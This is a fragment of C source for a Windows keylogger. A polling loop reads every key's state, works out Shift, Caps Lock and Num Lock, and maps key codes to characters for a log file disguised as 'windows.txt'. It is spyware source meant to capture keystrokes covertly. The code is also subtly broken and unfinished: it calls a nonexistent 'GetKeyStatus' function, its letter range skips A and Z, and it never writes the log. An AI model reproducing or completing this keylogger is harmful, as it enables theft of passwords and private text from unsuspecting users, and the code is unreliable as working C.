DWORD WINAPI logg() {

	int vkey, last_key_status[0xFF];
	int isCAPSLOCK, isNUMLOCK;
	int isL_SHIFT, isR_SHIFT;
	int isPressed;

	char showKey;
	char NUMCHAR[] = ")!@#$%^&*(";
	char chars_vn[] = ";=,-./`";
	char chars_vs[] = ":+<_>?~"; 
	char chars_va[] = "[\\]\';";
	char chars_vb[] = "{|}\"";

	FILE* FK;

	char KEY_LOG_FILE[] = "windows.txt";

	for (vkey = 0; vkey < 0xFF; vkey++) {
		last_key_status[vkey] = 0;
	}

	while (1) {

		Sleep(10);

		isCAPSLOCK = (GetKeyStatus(0x14) & 0xFF) > 0 ? 1 : 0 ;
		isNUMLOCK = (GetKeyStatus(0x90) & 0xFF) > 0 ? 1 : 0;
		isL_SHIFT = (GetKeyStatus(0xA0) & 0xFF00) > 0 ? 1 : 0;
		isR_SHIFT = (GetKeyStatus(0xA1) & 0xFF00) > 0 ? 1 : 0;

		for (vkey = 0; vkey < 0xFF; vkey++) {

			isPressed = (GetKeyStatus(vkey) & 0xFF00) > 0 ? 1 : 0;
			showKey = (char)vkey;
			 // check if the key is newlly pressed
			if (isPressed == 1 && last_key_status[vkey] == 0) {

				// for alphabet keys
				if (vkey > 0x41 && vkey < 0x5A) {
					if (isCAPSLOCK == 0) {
						if (isL_SHIFT == 0 && isR_SHIFT == 0) {
							showKey = (char)(vkey + 0x20);
						}

					}
					else if (isL_SHIFT == 1 || isR_SHIFT == 1) {
						showKey = (char)(vkey + 0x20);
					}
				}
				// for numbers characters;
				else if (vkey >= 0x30 && vkey <= 0x39) {
					if (isL_SHIFT == 1 || isR_SHIFT == 1) {
						showKey = NUMCHAR[vkey - 0x30];
					}
				}
				 // for numpad
				else if (vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1) {
					showKey = (char)(vkey - 0X30);
				}


			}

		}





	}

	






}